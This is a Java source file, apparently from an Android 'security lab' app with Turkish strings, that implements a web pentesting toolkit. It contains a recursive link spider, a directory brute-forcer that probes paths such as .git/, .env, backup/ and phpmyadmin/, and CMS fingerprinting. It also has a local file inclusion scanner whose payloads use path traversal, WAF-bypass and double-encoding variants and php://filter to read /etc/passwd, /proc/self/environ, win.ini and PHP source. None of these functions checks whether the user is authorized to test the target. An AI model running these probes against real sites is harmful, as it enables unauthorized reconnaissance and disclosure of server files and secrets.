package com.example.karageyazilimsecuritylab;

import java.util.HashSet;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class WebPentestPro {

    // --- 1. SPIDER V2 (BFS MantÄ±ÄŸÄ± & Duplicate KorumasÄ±) ---
    public static void startSpider(String startUrl, RequestManager.Callback callback) {
        callback.onResult("ğŸ•·ï¸ SPIDER V2 BAÅLATILDI: " + startUrl);
        Set<String> visited = new HashSet<>();

        RequestManager.submit(() -> crawlRecursive(startUrl, visited, callback, 0));
    }

    private static void crawlRecursive(String url, Set<String> visited, RequestManager.Callback callback, int depth) {
        if (depth > 2 || visited.contains(url)) return; // Derinlik limiti 2
        visited.add(url);

        String response = RequestManager.makeHttpRequest(url);
        if (response.startsWith("ERROR")) return;

        String body = response.split("\\|\\|BODY:")[1];

        // Regex ile href Ã§ekme
        Pattern p = Pattern.compile("href=\"(http[^\"]*)\"");
        Matcher m = p.matcher(body);

        while (m.find()) {
            String foundUrl = m.group(1);
            if (!visited.contains(foundUrl)) {
                callback.onResult("[LINK] " + foundUrl);
                // Alt linkleri de tara (Recursive)
                crawlRecursive(foundUrl, visited, callback, depth + 1);
            }
        }
    }

    // --- 2. DIRBUSTER PRO (Heuristics & Status Check) ---
    public static void startDirBuster(String domain, RequestManager.Callback callback) {
        callback.onResult("ğŸ“‚ DIRBUSTER PRO BAÅLATILDI...");
        String baseUrl = domain.endsWith("/") ? domain : domain + "/";

        // Kritik Dizinler Listesi
        String[] paths = {
                "admin/", "login/", "dashboard/", "uploads/", "images/", "js/",
                "css/", "backup/", ".git/", "config/", ".env", "robot.txt",
                "sitemap.xml", "api/", "test/", "db/", "phpmyadmin/"
        };

        for (String path : paths) {
            RequestManager.submit(() -> {
                String target = baseUrl + path;
                String res = RequestManager.makeHttpRequest(target);

                if (res.startsWith("CODE:200")) {
                    callback.onResult("<font color='#00FF00'>[âœ”] BULUNDU (200): " + target + "</font>");
                } else if (res.startsWith("CODE:403")) {
                    callback.onResult("<font color='#FFFF00'>[!] YASAKLI (403): " + target + "</font>");
                } else if (res.startsWith("CODE:30")) {
                    callback.onResult("<font color='#00FFFF'>[->] YÃ–NLENDÄ°RME: " + target + "</font>");
                }
            });
        }
    }

    // --- 3. LFI ANALYZER V2 (WAF Bypass & Null Byte) ---
    public static void startLFI(String url, RequestManager.Callback callback) {
        if (!url.contains("=")) {
            callback.onResult("Hata: Parametre gerek (Ã¶rn: site.com?page=)");
            return;
        }

        String cleanUrl = url.substring(0, url.indexOf("=") + 1);
        String[] payloads = {
                "../../../../etc/passwd",           // Standart
                "....//....//....//etc/passwd",     // WAF Bypass 1
                "..%252f..%252f..%252fetc/passwd", // Double Encoding
                "/proc/self/environ",               // Proc eriÅŸimi
                "../../../../windows/win.ini",      // Windows
                "php://filter/convert.base64-encode/resource=index.php" // PHP Filter
        };

        callback.onResult("ğŸ’‰ LFI SALDIRISI BAÅLATILDI...");

        for (String payload : payloads) {
            RequestManager.submit(() -> {
                String target = cleanUrl + payload;
                String res = RequestManager.makeHttpRequest(target);

                if (res.contains("root:x:0:0") || res.contains("[extensions]") || res.contains("16-bit app")) {
                    callback.onResult("<font color='#FF0000'>[!!!] KRÄ°TÄ°K LFI BULUNDU: " + target + "</font>");
                }
            });
        }
    }

    // --- 4. CMS DETECTION (Parmak Ä°zi) ---
    public static void detectCMS(String url, RequestManager.Callback callback) {
        RequestManager.submit(() -> {
            String res = RequestManager.makeHttpRequest(url);
            String body = res.length() > 20 ? res.split("\\|\\|BODY:")[1].toLowerCase() : "";

            if (body.contains("wp-content") || body.contains("yoast")) {
                callback.onResult("âœ… CMS TESPÄ°TÄ°: WORDPRESS");
            } else if (body.contains("joomla") || body.contains("/templates/")) {
                callback.onResult("âœ… CMS TESPÄ°TÄ°: JOOMLA");
            } else if (body.contains("drupal")) {
                callback.onResult("âœ… CMS TESPÄ°TÄ°: DRUPAL");
            } else {
                callback.onResult("[-] CMS TanÄ±mlanamadÄ± veya Ã–zel YazÄ±lÄ±m.");
            }
        });
    }
}